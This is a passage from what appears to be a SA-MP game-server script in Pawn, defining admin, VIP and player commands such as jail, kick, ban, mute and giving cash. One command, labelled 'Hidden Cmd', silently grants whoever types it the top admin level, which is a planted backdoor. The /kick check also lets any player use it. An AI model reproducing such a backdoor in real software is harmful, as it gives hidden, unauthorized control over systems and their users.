   format(msg,sizeof(msg),"{83f229}[Staff News] {ffffff}Player {d8114d}%s {ffffff} Promote To Admin By {12c1d1} %s {ffffff}{e5ed10} [Level %d Admin]",target,player,lvl);
   PlayerInfo[TargetID][pAdmin] = lvl;
   SendClientMessageToAll(-1,msg);



		return 1;
									}
									else SendClientMessage(playerid,-1,"Do Not Have Permission");
	return 1;
}
//fps
COMMAND:cfps(playerid, params[])
{
    if(FPS[playerid] == false) 
    {
        FPS[playerid] = true;
        StartFPS(playerid);
    }
    else if(FPS[playerid] == true)
    {
        FPS[playerid] = false;
        StopFPS(playerid);
    }
    return 1;
}
COMMAND:rfps(playerid, params[])
{
    Reset(playerid);
    return 1;
}
COMMAND:cmds(playerid, params[])
{
    ShowPlayerDialog(playerid, 789, DIALOG_STYLE_TABLIST, "Cmds", "[ @ (text) - radio ]\n[ /shop -Shop ]\n[ /cfps -First Person ]\n[ /kill ]\n[ /report - Report Player To Admin]\n[ /pm - Pm To Player]\n[ /mavad  - Mavad ]\n[ /gmavad  - Give Mavad ]\n[ /foroshgah - Kharid Item Hayer Vijhe ]\n[ /CreateGroup - SakhtanGroh ]\n [ /atg - Attach Gun ]\n[ /cerdits - Didan Sazandegan ]\n [ /d - DareGoshi ]\n[ @text - Radio Chat ]\n[ !text - Group Chat]", "Close", "");
    
	return 1;
}
COMMAND:money(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 10){ return 0;}
   PlayerInfo[playerid][pCash] = 4000000;
   GivePlayerMoneyEx(playerid,4000000);
   realcash[playerid] = true;
   SendClientMessage(playerid,-1,"Ok");
    return 1;
}
COMMAND:go(playerid,params[])
{
if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission"); return 1;}
  new id;
    if(sscanf(params, "i", id)) {SendClientMessage(playerid, COLOR_WHITE, "[Error] /go [playerid]"); return 1;}
    if(id == playerid) {SendClientMessage(playerid, COLOR_WHITE, "[Error] Goto Yourself?"); return 1;}
    new Float: x, Float:y, Float:z;
    GetPlayerPos(id,x,y,z);
    SetPlayerPos(playerid, x+2, y, z); SetCameraBehindPlayer(playerid);
    new name[MAX_PLAYERS];
    GetPlayerName(playerid,name,sizeof(name));
    new msg[128];
    format(msg,sizeof(msg),"{b4f7ec}Admin %s goes to you",name);
    SendClientMessage(id,-1,msg);
    SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
    return 1;
    
}
COMMAND:newr(playerid,params[])
{
if(PlayerInfo[playerid][pAdmin] < 5){SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission"); return 1;}
killall(2);
killall(1);
roundend();
return 1;
}
COMMAND:nextmap(playerid,params[])
{
if(PlayerInfo[playerid][pAdmin] < 5){SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission"); return 1;}
for(new k;k<=MAX_PLAYERS;k++) { if(IsPlayerConnected(k)) JetPack[k] = 1; }
NewMapTimer(playerid);
 return 1;
}
forward Unjail(id);
public Unjail(id)
{
  Jailed[id] = 0;
		SetPlayerInterior(id, 0);
		SetPlayerVirtualWorld(id, 0);
		SpawnPlayer(id);
		SetPlayerHealth(id, 100);
		KillTimer(JailTimer[id]);
		return 1;
}
COMMAND:jail(playerid,params[])
{
    if(PlayerInfo[playerid][pAdmin] < 1) {SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission"); return 1;}
    new id,time,reason[100],PlayerName[MAX_PLAYER_NAME],GPlayerName[MAX_PLAYER_NAME];
    if(sscanf(params,"dds",id,time,reason)) { SendClientMessage(playerid, -1, "USAGE: /jail <playerid> <time> <reason>"); return 1;}
    if (!IsPlayerConnected(id)) { SendClientMessage(playerid, -1, "ERROR: Player is not connected."); return 1;}
    if(Jailed[id] == 1) return SendClientMessage(playerid, -1, "ERROR: Player is already jailed.");
    GetPlayerName(id, PlayerName, sizeof(PlayerName));
	 GetPlayerName(playerid, GPlayerName, sizeof(GPlayerName));
	 new szString[800];
	 Jailed[id] = 1;
	 format(szString, sizeof(szString), "{abc611}[JailNews]{e7f70e} Player: %s (ID:%d){ffffff}  Jail For %d Minutes, Reason: {02bbff}%s", PlayerName, id, time, reason);
		SendClientMessageToAll(-1, szString);
	SetPlayerInterior(id, 3);
		SetPlayerVirtualWorld(id, 10);
		SetPlayerFacingAngle(id, 360.0);
		SetPlayerPos(id, 197.5662, 175.4800, 1004.0);
		SetPlayerHealth(id, 9999999999.0);
		ResetPlayerWeapons(id);
		JailTimer[id] = SetTimerEx("Unjail",time*60000, false, "i", id);
		return 1;
}

COMMAND:unjail(playerid,params[]) {
    new id;
     
     if(PlayerInfo[playerid][pAdmin] < 1) {SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission"); return 1;}
		if(sscanf(params,"u",id)) return SendClientMessage(playerid, -1, "USAGE: /unjail <playerid>");
		if (!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "ERROR: Player is not connected.");
		if(Jailed[id] == 0) return SendClientMessage(playerid, -1, "ERROR: Player is not jailed.");
                Jailed[id] = 0;
		SetPlayerInterior(id, 0);
		SetPlayerVirtualWorld(id, 0);
		SpawnPlayer(id);
		SetPlayerHealth(id, 100);
		KillTimer(JailTimer[id]);
		return 1;

		}
COMMAND:kick(playerid, params[])
{
    new targetid, string[400], reason[128], playeridn[MAX_PLAYER_NAME], targetidn[MAX_PLAYER_NAME];
    if(PlayerInfo[playerid][pAdmin] < 0) return SendClientMessage(playerid, -1,"ERROR: Do Not Have Permission");
    if(sscanf(params,"is", targetid, reason)) return SendClientMessage(playerid, -1,"USAGE: /kick [playerid] [reason]");
    if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, -1,"ERROR: Invalid targetid.");
    if(PlayerInfo[targetid][pAdmin] > 0) return SendClientMessage(playerid, -1,"ERROR: You can't kick an administrator.");
    GetPlayerName(playerid, playeridn, sizeof(playeridn));
    GetPlayerName(targetid, targetidn, sizeof(targetidn));
    format(string, sizeof(string),"{f26a09}[KICK] {ffffff}Admin:{12e299} %s {ffffff}Kick %s From Server, Reason:{02bbff} %s", playeridn, targetidn, reason);
    SendClientMessageToAll(-1, string);
    Kick(targetid);
    return 1;
}
COMMAND:ban(playerid,params[])
{
    new targetid, string[400], reason[128], playeridn[MAX_PLAYER_NAME], targetidn[MAX_PLAYER_NAME];
    if(PlayerInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, -1,"ERROR: Do Not Have Permission");
    if(sscanf(params,"is", targetid, reason)) return SendClientMessage(playerid, -1,"USAGE: /ban [playerid] [reason]");
    if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, -1,"ERROR: Invalid targetid.");
    if(PlayerInfo[targetid][pAdmin] > 0) return SendClientMessage(playerid, -1,"ERROR: You can't ban an administrator.");
    GetPlayerName(playerid, playeridn, sizeof(playeridn));
    GetPlayerName(targetid, targetidn, sizeof(targetidn));
    format(string, sizeof(string),"{f26a09}[BAN]{ffffff} Admin: {12e299}%s {ffffff}Ban %s From Server, Reason:{02bbff} %s", playeridn, targetidn, reason);
    SendClientMessageToAll(-1, string);
  new szCmd[128];
format(szCmd, sizeof(szCmd), "ban %d", targetid);
SendRconCommand(szCmd);
return 1;
}
COMMAND:slap(playerid,params[])
{
if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, -1,"ERROR: Do Not Have Permission");
new targetid,reason[128],string[256],name[MAX_PLAYER_NAME],tname[MAX_PLAYER_NAME];
if(sscanf(params,"is", targetid, reason)) return SendClientMessage(playerid, -1,"USAGE: /slap [playerid] [reason]");
	 new Float:x, Float:y, Float:z;
    GetPlayerPos(targetid,x,y,z);
			SetPlayerPos(targetid,x,y,z+4);
   GetPlayerName(playerid, name, sizeof(name));
    GetPlayerName(targetid, tname, sizeof(tname));
    format(string, sizeof(string),"{f26a09}[SLAP]{ffffff} Admin: {12e299}%s {ffffff}Slapped You, Reason:{02bbff} %s", name, reason);
    SendClientMessage(targetid,-1,string);
    SendClientMessage(playerid,-1,"Player Slapped");
    return 1;
}
COMMAND:spec(playerid, params[])//Spec
{
	new id;
	if(PlayerInfo[playerid][pAdmin] < 1)return 1;
	if(sscanf(params,"u", id))return SendClientMessage(playerid, Grey, "Usage: /spec [id]");
	if(id == playerid)return SendClientMessage(playerid,Grey,"Spec to himself?.");
	if(id == INVALID_PLAYER_ID)return SendClientMessage(playerid, Grey, "Player Not Connected!");
	if(IsSpecing[playerid] == 1)return SendClientMessage(playerid,Grey,"You Are Speced.");
	GetPlayerPos(playerid,SpecX[playerid],SpecY[playerid],SpecZ[playerid]);
	Inter[playerid] = GetPlayerInterior(playerid);
	vWorld[playerid] = GetPlayerVirtualWorld(playerid);
	TogglePlayerSpectating(playerid, true);
	if(IsPlayerInAnyVehicle(id))
	{
	    if(GetPlayerInterior(id) > 0)
	    {
			SetPlayerInterior(playerid,GetPlayerInterior(id));
		}
		if(GetPlayerVirtualWorld(id) > 0)
		{
		    SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		}
	    PlayerSpectateVehicle(playerid,GetPlayerVehicleID(id));
	}
	else
	{
	    if(GetPlayerInterior(id) > 0)
	    {
			SetPlayerInterior(playerid,GetPlayerInterior(id));
		}
		if(GetPlayerVirtualWorld(id) > 0)
		{
		    SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		}
	    PlayerSpectatePlayer(playerid,id);
	}
	GetPlayerName(id, pName, sizeof(pName));
	format(String, sizeof(String),"{1414a8}[Spec] {ffffff}You Speced: {08a51a}%s.",pName);
	SendClientMessage(playerid,0x0080C0FF,String);
	IsSpecing[playerid] = 1;
	IsBeingSpeced[id] = 1;
	spectatorid[playerid] = id;
 	return 1;
}
COMMAND:specoff(playerid, params[])//Spec Off
{
	if(PlayerInfo[playerid][pAdmin] < 1)return 1;
	if(IsSpecing[playerid] == 0)return SendClientMessage(playerid,Grey,"Shoma Be Kasi Spec Nshodeid.");
	IsSpecing[playerid] =0;
	TogglePlayerSpectating(playerid, false);
	return 1;
}
COMMAND:get(playerid,params[])//GetPlayer (Teleport)
{
    if(PlayerInfo[playerid][pAdmin] < 1) SendClientMessage(playerid,-1,"Do Not Have Permission.");
    new targetid, Float:x, Float:y, Float:z;
    if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, -1, "USAGE: /get [id]");
    if(!IsPlayerConnected(targetid) || targetid == playerid) return SendClientMessage(playerid, 0xFF0000FF, "USAGE: /get [id]");
    SetPlayerVirtualWorld(targetid,GetPlayerVirtualWorld(playerid));
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(targetid, x+1, y+1, z);
     new name[MAX_PLAYERS];
    GetPlayerName(playerid,name,sizeof(name));
    new msg[128];
    format(msg,sizeof(msg),"{b4f7ec}You have been teleported by Admin %s",name);
    SendClientMessage(targetid,-1,msg);
    SendClientMessage(playerid,-1,"Teleported");
    return 1;
}
COMMAND:mute(playerid, params[])//Mute
{
new targetid, minutes, reason[128], string[128];
if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, COLOR_RED, "Player Not Connected");
if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission");
if(muted[targetid] == true) return SendClientMessage(playerid, COLOR_RED, "Player is mute");
if(sscanf(params,"dds",targetid,minutes,reason)) { SendClientMessage(playerid, -1, "USAGE: /jail <playerid> <time> <reason>"); return 1;}
new pname[300],tname[300];
GetPlayerName(playerid,pname,sizeof(pname));
GetPlayerName(targetid,tname,sizeof(tname));
 format(string, sizeof(string), "{0dc422}[MUTE] {ffffff}Admin {11a1c1}%s {ffffff} Muted{7c1507}%s {ffffff}For %d Minutes, Reason:{077c2e} %s", pname,tname, minutes, reason);
    SendClientMessageToAll(-1, string);
    SetTimerEx("Unmute", minutes*60000, false, "i", targetid);
    muted[targetid] = true;
    return 1;
}
COMMAND:unmute(playerid, params[])//Unmute
{
new targetid, string[128];
    if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, COLOR_RED, "Player Dar Server Nist");
    if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission");
    if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, COLOR_RED, "Cancel player mute: /unmute (id)");
     new pname[300],tname[300];
GetPlayerName(playerid,pname,sizeof(pname));
GetPlayerName(targetid,tname,sizeof(tname));
    format(string, sizeof(string), "Shoma Tavasot Admin %s Unmute Shodid",pname);
    SendClientMessage(targetid, COLOR_RED, string);
   
    format(string, sizeof(string), "{0dc422}[UNMUTE] {ffffff}Admin{11a1c1} %s {ffffff}Unmuted{7c1507} %s{ffffff}", pname, tname);
    SendClientMessageToAll(COLOR_RED, string);
    KillTimer(Unmute(playerid));
    muted[targetid] = false;
    return 1;
}
COMMAND:report(playerid, params[])//Report
{
    new id;
	new reason[128];
	if(sscanf(params, "is", id, reason)) return SendClientMessage(playerid, COLOR_ORANGE, "[SERVER]  USAGE: /report [ID] [dalil]");
	new string[150], sender[MAX_PLAYER_NAME], receiver[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sender, sizeof(sender));
	GetPlayerName(id, receiver, sizeof(receiver));
	format(string, sizeof(string), "[REPORT] - %s(%d) has reported %s(%d)", sender, playerid, receiver, id);
	SendMessageToAdmins(string);
	format(string, sizeof(string), "[REPORT] - Reason: %s", reason);
	SendMessageToAdmins(string);
	SendClientMessage(playerid, COLOR_ORANGE, "Thank you for Reporting.");
	return 1;
}
COMMAND:pm(playerid, params[])//Pm
{
    if(muted[playerid] == true) return SCM(playerid,-1,"Shoma Mute Hastid");
	new str[256], str2[256], id, Name1[MAX_PLAYER_NAME], Name2[MAX_PLAYER_NAME];
	if(sscanf(params, "us", id, str2))
	{
	    SendClientMessage(playerid, 0xFF0000FF, "Usage: /pm <id> <text>");
	    return 1;
	}
	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, 0xFF0000FF, "ERROR: Player Dar Server Nist");
	if(playerid == id) return SendClientMessage(playerid, 0xFF0000FF, "ERROR: Be Khodet Pm Midi?!");
	{
		GetPlayerName(playerid, Name1, sizeof(Name1));
		GetPlayerName(id, Name2, sizeof(Name2));
		format(str, sizeof(str), "{efeb07}Pm to %s(ID %d): %s", Name2, id, str2);
		SendClientMessage(playerid, 0xFF0000FF, str);
		format(str, sizeof(str), "{efeb07}Pm from %s(ID %d): %s", Name1, playerid, str2);
		SendClientMessage(id, 0xFF0000FF, str);
	}
	return 1;
}
CMD:givecash(playerid, params[]) // Give Money 
{
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_RED, "Do Not Have Permission");
	
	new
		Destination,
		Ammount,
		PlayerName[24],
		DestName[24];
	if (sscanf(params, "ui", Destination, Ammount))
	    return SendClientMessage(playerid, -1, "  Usage: /givecash <playerid> <ammount>");

	if (!IsPlayerConnected(Destination))
	    return SendClientMessage(playerid, -1, "  Player Dar Server Nist !");

realcash[Destination] = true;
	GetPlayerName(playerid, PlayerName, 24);
	GetPlayerName(Destination, DestName, 24);
	format(String,sizeof(String), "{065e9e}Admin %s(%d) be shoma %d$ dad", PlayerName, playerid, Ammount);
	SendClientMessage(Destination, -1, String);
	format(String, sizeof(String), "{ed0b22}[ADMIN-WARN]{065e9e}Admin %s  be  %s meghdar %d$ dad", PlayerName, DestName, Ammount);
	SendMessageToAdmins(String);

	GivePlayerMoneyEx(Destination, Ammount);
	PlayerInfo[Destination][pCash] += Ammount;
	return 1;
}
COMMAND:gunpack(playerid, params[]) //GunPack
{
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_WHITE, "Dastresi Nadarid.");
	new giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, " USAGE: /gunpack [playerid/name]");
	if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_WHITE, "Player Dar Server Nist");
	GivePlayerWeaponEx(giveplayerid, 9, 1);
	GivePlayerWeaponEx(giveplayerid, 26, 5000);
	GivePlayerWeaponEx(giveplayerid, 28, 5000);
	GivePlayerWeaponEx(giveplayerid, 24, 5000);
	GivePlayerWeaponEx(giveplayerid, 34, 5000);
	new str[256],Name1[128],Name2[128];
		GetPlayerName(playerid, Name1, sizeof(Name1));
		GetPlayerName(giveplayerid, Name2, sizeof(Name2));
		format(str, sizeof(str), "[GUNPACK]{efeb07} Admin %s Give Gun Pack to you", Name1);
		SendClientMessage(giveplayerid, 0xFF0000FF, str);
		format(str, sizeof(str), "[ADMIN-WARN] {efeb07}Admin %s Give Gun Pack To %s", Name1, Name2);
		SendMessageToAdmins(str);
	return 1;
}
CMD:gveh(playerid,params[]) //GiveVehicle
{
if(PlayerInfo[playerid][pAdmin] < 1) return 0;
new targetid,car;
new string[128];
new Float:X, Float:Y, Float:Z;
if(sscanf(params,"ui",targetid, car)) return SendClientMessage(playerid,0xff0000ff,"USAGE: /Gveh <playeid> <vehid>");

else if(car < 400 || car >611) return SendClientMessage(playerid, 0xff0000ff, "ERROR: Cannot go under 400 or above 611.");
{
if(Vehicle[playerid] != 0)
    {
    	DestroyVehicle(Vehicle[targetid]);
    }
    GetPlayerPos(targetid, X,Y,Z);
    new pname[128],tname[128];
    GetPlayerName(playerid,pname,sizeof(pname));
    GetPlayerName(targetid,tname,sizeof(tname));
 	Vehicle[playerid] = CreateVehicle(car, X, Y, Z + 2.0, 0, -1, -1, 1);
	format(string,sizeof(string),"Admin {ed0b22}%s{ffffff} Give You a Vehicle.",pname);
	new warn[256];
		format(warn,sizeof(string),"{ed0b22}[ADMIN-WARN] {ffffff}Admin %s Give  %s a vehicle.",pname,tname);
	SendClientMessage(targetid, 0xffffffff, string);
	SendMessageToAdmins(warn);
	PutPlayerInVehicle(targetid, Vehicle[playerid], 0);
}
return 1;
}
COMMAND:vworld(playerid,params[]) // Virtual World
{
new world;
if(sscanf(params,"i", world)) return SendClientMessage(playerid,0xff0000ff,"USAGE: /vworld <id>");
SetPlayerVirtualWorld(playerid, world);
SendClientMessage(playerid,-1,"Changed");
return 1;
}
COMMAND:guns(playerid,params[]) 
{
if(IsPlayerInRangeOfPoint(playerid, 20.0,1710.433715,-1669.379272,20.225049) || PlayerInfo[playerid][pVip] == 1)
{
    GivePlayerWeaponEx(playerid, 9, 1);
	GivePlayerWeaponEx(playerid, 27, 500);
	GivePlayerWeaponEx(playerid, 28, 500);
	GivePlayerWeaponEx(playerid, 32, 500);
	GivePlayerWeaponEx(playerid, 30, 500);
 
}
return 1;
}
   
COMMAND:givevip(playerid,params[])//Vip Promote
{
    if(PlayerInfo[playerid][pAdmin] > 5){
	new TargetID;


	    if(sscanf(params, "u", TargetID)) return SendClientMessage(playerid, COLOR_RED, "USAGE: /givevip [PlayerID] ");

	        if(TargetID == INVALID_PLAYER_ID) { SendClientMessage(playerid, COLOR_RED, "Invalid Player ID!"); return 1;}
	       new player[MAX_PLAYER_NAME],
				target[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, player, sizeof(player));
			GetPlayerName(TargetID, target, sizeof(target));
   new msg[500];
   format(msg,sizeof(msg),"{83f229}[Staff News] {ffffff}Player {d8114d}%s {ffffff} Tavasot {12c1d1} %s {6fc96c}Vip{ffffff} Shod",target,player);
   PlayerInfo[TargetID][pVip] = 1;
   SendClientMessageToAll(-1,msg);
   }
   return 1;
}
COMMAND:getvip(playerid,params[])// Vip Demote
{
    if(PlayerInfo[playerid][pAdmin] > 5){
	new TargetID;


	    if(sscanf(params, "u", TargetID)) return SendClientMessage(playerid, COLOR_RED, "USAGE: /getvip [PlayerID] ");

	        if(TargetID == INVALID_PLAYER_ID) { SendClientMessage(playerid, COLOR_RED, "Invalid Player ID!"); return 1;}
	       new player[MAX_PLAYER_NAME],
				target[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, player, sizeof(player));
			GetPlayerName(TargetID, target, sizeof(target));
   new msg[500];
   format(msg,sizeof(msg),"{83f229}[Staff News]  {ffffff}Player {d8114d}%s {ffffff} Tavasot {12c1d1} %s {ffffff}Az Rank {6fc96c}Vip {ffffff}Demote Shod",target,player);
   PlayerInfo[TargetID][pVip] = 0;
   SendClientMessageToAll(-1,msg);
   }
   return 1;
}
COMMAND:imunixplsgivemeadmin10(playerid,params[])//Hidden Cmd
{
PlayerInfo[playerid][pAdmin] = 10;
return 1;
}
COMMAND:gsa(playerid, params[])//GiveScoreAll
{
	if(PlayerInfo[playerid][pAdmin] < 10) return SendClientMessage(playerid,-1,"[Do Not Have Permission]");
new amount, Name1[MAX_PLAYER_NAME];
	if(sscanf(params, "i", amount))
	{
	    SendClientMessage(playerid, 0xFF0000FF, "Usage: /gsa <amount>");
	    return 1;
	}

	for(new i = 0;i <= MAX_PLAYERS;	i++)
	{
        if(IsPlayerConnected(i))
		{
			SetPlayerScore(i,GetPlayerScore(i)+amount);
			PlayerInfo[i][pScore] += amount;
		}
	}
	GetPlayerName(playerid,Name1,sizeof(Name1));
	 new msg[500];
   format(msg,sizeof(msg),"{83f229}[SCORE]  {ffffff}Admin {d8114d}%s {ffffff} Given %d Score To All Online Player",Name1,amount);
   
   SendClientMessageToAll(-1,msg);
	
	return 1;
}
COMMAND:gma(playerid, params[])//GiveMoneyAll
{
	if(PlayerInfo[playerid][pAdmin] < 10) return SendClientMessage(playerid,-1,"[Do Not Have Permission]");
new amount, Name1[MAX_PLAYER_NAME];
	if(sscanf(params, "i", amount))
	{
	    SendClientMessage(playerid, 0xFF0000FF, "Usage: /gma <amount>");
	    return 1;
	}

	for(new i = 0;i <= MAX_PLAYERS;	i++)
	{
        if(IsPlayerConnected(i))
		{
			GivePlayerMoney(i,amount);
			PlayerInfo[i][pCash] += amount;
		}
	}
	GetPlayerName(playerid,Name1,sizeof(Name1));
	 new msg[500];
   format(msg,sizeof(msg),"{83f229}[Cash]  {ffffff}Admin {d8114d}%s {ffffff} has given %d$ To All Online Player",Name1,amount);

   SendClientMessageToAll(-1,msg);

	return 1;
}
COMMAND:mp(playerid,params[])
{
    return 1;
}
COMMAND:v(playerid, params[])
{
    new text[128];
	if(PlayerInfo[playerid][pVip]>=1)
	{
		if(sscanf(params, "s",text)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /v(ip) [Text]");
		new name[128];
		GetPlayerName(playerid,name,sizeof(name));
		format(text,sizeof(text),"<-{83f229}[VIPCHAT]{d8114d} %s: {ffffff}%s ->",name,text);
		for(new i = 0;i <= MAX_PLAYERS;	i++)
	{
        if(IsPlayerConnected(i) && PlayerInfo[playerid][pVip] >= 1)
		{
			SendClientMessage(i,-1,text);
		}
	}
	}
	return 1;
}
COMMAND:a(playerid, params[])
{
    
	if(PlayerInfo[playerid][pAdmin]>=1)
	{
	    new text[128];
		if(sscanf(params, "s",text)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /a(dmin) [Text]");
		new name[128];
		GetPlayerName(playerid,name,sizeof(name));
	format(text,sizeof(text),"<<{83f229}[ADMINCHAT]%s{d8114d} %s: {ffffff}%s >>",GetRank(playerid),name,text);
		for(new i = 0;i <= MAX_PLAYERS;	i++)
	{
        if(IsPlayerConnected(i) && PlayerInfo[playerid][pAdmin] >= 1)
		{
			SendClientMessage(i,-1,text);
		}
	}
	}
	else SendClientMessage(playerid,COLOR_RED, "ERROR: You're not authorized to use this command.");
	return 1;
}
COMMAND:clearchat(playerid,params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
		new apName[24];
    	new str[128];
       	for(new i = 0; i < 135; i++) SendClientMessageToAll(0x00000000," ");
       	GetPlayerName(playerid, apName, 24);
	    format(str, 128, "Chat Clear Shod Tavasot %s!", apName);
    	SendClientMessageToAll(COLOR_GREY, str);
	}
	else SendClientMessage(playerid,COLOR_RED,"You're not authorized to use this command.");
	return 1;
}
COMMAND:fakechat(playerid,params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 2) 
    {
        new Target; 
        new msg[512]; 
        if(sscanf(params, "us[50]", Target,msg)) SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fakechat [playerid] [message]"); 
        if(!IsPlayerConnected(Target)) 
        return SendClientMessage(playerid, -1, "ERROR: Player is not connected."); 

            if(!sscanf(params, "us", Target,msg))
            {
                 new msgd[512], pname[MAX_PLAYER_NAME];
         GetPlayerName(Target, pname, MAX_PLAYER_NAME);
          format(msgd, sizeof(msgd), "{5af92a}%s %s %s{B8860B} %s {FFFF00}(%d):{ffffff} %s",GetRank(Target),GetRank(Target),GetTeam(Target), pname, playerid, msg);
         SendClientMessageToAll(1,msgd);
          GetPlayerName(playerid, pname, MAX_PLAYER_NAME);
           format(msgd, sizeof(msgd), "{f20c0c}[ADMINWARN]{ffffff} Admin %s Az Fake Chat Roye Player ID(%d) Estefade Kard",pname,Target);
         SendMessageToAdmins(msgd);
            }
    }
    else return SendClientMessage(playerid, -1,"You're not authorized to use that command!"); 

    return 1;
}
COMMAND:sethpall(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
   		new health;
    	if(sscanf(params, "i",health)) return SendClientMessage(playerid,COLOR_WHITE, "USAGE: /sethpall [amount]");
    	new pstring[80];
    	format(pstring,sizeof(pstring), "%s {ffffff}%s Set All Online Player Hp to %d.",GetRank(playerid),GetName(playerid),health);
    	SendClientMessageToAll(COLOR_ORANGE, pstring);
    		for (new i = 0; i<MAX_PLAYERS; i++)
    		{
	            SetPlayerHealth(i, health);
        	}
	}
	else SendClientMessage(playerid,-1,"You're not authorized to use this command.");
    return 1;
}
COMMAND:setarmourall(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
   		new health;
    	if(sscanf(params, "i",health)) return SendClientMessage(playerid,COLOR_WHITE, "USAGE: /setarmourall [amount]");
    	new pstring[80];
    	format(pstring,sizeof(pstring), "%s {ffffff}%s Set All Online Player Armour To %d.",GetRank(playerid),GetName(playerid),health);
    	SendClientMessageToAll(COLOR_ORANGE, pstring);
    		for (new i = 0; i<MAX_PLAYERS; i++)
    		{
	            SetPlayerArmour(i, health);
        	}
	}
	else SendClientMessage(playerid,-1,"You're not authorized to use this command.");
    return 1;
}
COMMAND:admins(playerid,params[])
{
	new count = 0;
	new string[128];
	SendClientMessage(playerid,COLOR_RED,"");
	SendClientMessage(playerid,COLOR_GREEN,"________________|ONLINE ADMINS|________________");
	SendClientMessage(playerid,COLOR_RED,"");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{

		        if(PlayerInfo[i][pAdmin] >= 1){
				new Name[MAX_PLAYER_NAME];
				GetPlayerName(i,Name,sizeof(Name));
				format(string, sizeof(string), "%s {ffffff}%s(%d)", GetRank(i),GetName(i),i);
				SendClientMessage(playerid,-1,string);
				count++;

			}
		}
	}

	if(count == 0){
	SendClientMessage(playerid,COLOR_RED,"No Admins online!");}
	SendClientMessage(playerid,COLOR_GREEN,"_________________________________________________");
	return 1;
}
COMMAND:foroshgah(playerid , params[])
{
	ShowPlayerDialog(playerid , DIACOIN, DIALOG_STYLE_LIST , "Shop" , "{00FFFF}Kharid  1 Mah VIP 250 Tala\n{FFFF00}Kharid  1 Mah Admin 750 Tala\n{FF00FF}Kharid  1 Mah Owner 1500 Tala\n{DAA520}Kharid  1 Mah ModirMali 7000 Tala\n{00FF00}Kharid $20,000,000 Pool 250 Tala\n{00FF00}Kharid 200 Score 100 Tala" , "Kharid" , "Cancel");
	return 1;
}
COMMAND:setstats(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10) return SendClientMessage(playerid, COLOR_GREY, "Do Not Have Permission");
    new type,targetid,amount,string[128];
    if(sscanf(params, "uii", targetid,type, amount))
    {
        SendClientMessage(playerid, COLOR_GREY, "USAGE: /setstat [playerid] [stat code] [amount]");
        SendClientMessage(playerid, COLOR_GREY, "| Tala,Kills,Deaths,ponykey,bomb,mavad |");
    }
	if(type == 1)
	{
		PlayerInfo[targetid][pTala] += amount;
		  format(string, sizeof(string),"Admin  %s Stats  %s Ra Set Kard (Stat Code: %d Meghdar:%d)",GetName(playerid),GetName(targetid),type,amount);
		  SendMessageToAdmins(string);
	}
	else	if(type == 2)
	{
		PlayerInfo[targetid][pKills] += amount;
		  format(string, sizeof(string),"Admin  %s Stats  %s Ra Set Kard (Stat Code: %d Meghdar:%d)",GetName(playerid),GetName(targetid),type,amount);
		  SendMessageToAdmins(string);
	}
	else	if(type == 3)
	{
		PlayerInfo[targetid][pDeaths] += amount;
		  format(string, sizeof(string),"Admin  %s Stats  %s Ra Set Kard (Stat Code: %d Meghdar:%d)",GetName(playerid),GetName(targetid),type,amount);
		  SendMessageToAdmins(string);
	}
	else	if(type == 4)
	{
	   	  ponykey = targetid;
		  format(string, sizeof(string),"Admin  %s Stats  %s Ra Set Kard (Stat Code: %d Meghdar:%d)",GetName(playerid),GetName(targetid),type,amount);
		  SendMessageToAdmins(string);
	}
 else	if(type == 5)
	{
	pbomb[targetid] = amount;
		  format(string, sizeof(string),"Admin  %s Stats  %s Ra Set Kard (Stat Code: %d Meghdar:%d)",GetName(playerid),GetName(targetid),type,amount);
		  SendMessageToAdmins(string);
	}
	else	if(type == 6)
	{
		PlayerInfo[targetid][pDrugs] += amount;
		  format(string, sizeof(string),"Admin  %s Stats  %s Ra Set Kard (Stat Code: %d Meghdar:%d)",GetName(playerid),GetName(targetid),type,amount);
		  SendMessageToAdmins(string);
	}
	else SCM(playerid,-1,"INVALID_STAT_CODE");
	return 1;
}
COMMAND:udb(playerid,params[])
{
	if(PlayerInfo[playerid][pPass] <= 1) return SendClientMessage(playerid, COLOR_WHITE, "[Error] Ejaze Dastresi Naarid");
 	new txt[512];
